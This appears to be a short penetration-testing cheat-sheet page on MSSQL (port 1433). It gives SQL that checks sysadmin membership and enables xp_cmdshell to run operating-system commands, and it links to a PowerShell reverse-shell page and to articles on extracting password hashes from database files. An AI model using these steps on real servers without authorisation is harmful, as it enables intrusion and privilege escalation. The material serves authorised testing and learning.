# 1433 - MSSQL

## Connect to MSSQL from Kali

{% page-ref page="../../kits-1/tools-1/mssqlclient.py-impacket.md" %}

## MSSQL for PrivEsc

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
-----------
          1

EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;

EXEC sp_configure 'xp_cmdshell', 1
reconfigure;

xp_cmdshell "whoami"
```

{% hint style="info" %}
Compare the following syntax \(note the `;)`

* `EXEC xp_cmdshell "whoami";`
* `xp_cmdshell "whoami"`
{% endhint %}

{% page-ref page="../../collections/reverse-shell/shell-powershell.md" %}

## MSSQL System Databases

Documentation: [https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sqlallproducts-allversions](https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sqlallproducts-allversions)

To restore backups \(.bak\) or read database files \(.mdf and .ldf\) offline: 

* [https://blog.xpnsec.com/extracting-master-mdf-hashes/](https://blog.xpnsec.com/extracting-master-mdf-hashes/)
* [https://rastating.github.io/from-lfi-to-sql-database-backup/](https://rastating.github.io/from-lfi-to-sql-database-backup/)

